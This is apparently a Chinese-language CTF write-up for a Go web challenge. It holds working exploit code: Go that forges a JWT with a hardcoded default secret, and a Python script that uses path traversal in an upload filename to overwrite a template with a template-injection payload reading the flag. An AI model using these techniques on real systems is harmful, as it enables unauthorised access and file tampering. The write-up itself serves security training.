# PikaGo

## 第一步代码审计
我们看可以看到在用户名登录出错之后，还会再Redis中插入key为"token_"的信息。之后我们使用默认的Key构造JWT签名
```go
package main

import (
	"fmt"
	"time"

	"github.com/dgrijalva/jwt-go"
	"github.com/xiya-team/helpers"
)

var jwtSecret = []byte("9C27D0C7C04BDA8A1F1B099CF4F9B1956AF5164F")

func CreateToken(username string) string {
	claims := make(jwt.MapClaims)
	claims["exp"] = time.Now().Add(time.Hour * time.Duration(100)).Unix()
	claims["iat"] = time.Now().Unix()
	claims["id"] = 0
	claims["verification"] = helpers.Md5(username)
	claims["user_name"] = username
	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)

	//token.Claims=claims
	tokenString, _ := token.SignedString(jwtSecret)

	return tokenString
}

func main() {

	fmt.Println(CreateToken(""))

}
```
## 第二步，下载ELF文件与源码编译进行分析
我们可以通过编译原来的代码，与之Diff。即可看到在上传文件的地方有明显的差异。

通过一定的尝试，我们发现在文件名处可以做到目录穿越实现任意文件上传。

根据提示我们可以知道可以上传模板读取config文件。
```python
import requests
import jwt

JWT= "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2MDMyNzQ1NTAsImlhdC......."
def exp(ip):
    fake_login(ip)
    upload_file(ip)
    print(requests.get(ip + "/api/menu/index",headers={"Authorization":JWT}).text)
    print(requests.post(ip + "/api/upload/image",files={
        "file":("./../../../../../../../../app/views/menucontroller/index.tpl",'',"image/gif")
    },headers={"Authorization":JWT}).text)
def fake_login(ip):
    print(requests.post(ip + "/api/user/login",json={
        "user_name":"1",
        "password":"123456"
    }).text)

def upload_file(ip):
    print(requests.post(ip + "/api/upload/image",files={
        "file":("./../../../../../../../../app/views/menucontroller/index.tpl",'{{config "String" "ctf::flag" ""}}',"image/gif")
    },headers={"Authorization":JWT}).text)

if __name__ == '__main__':
    exp("http://10.104.255.223/")

```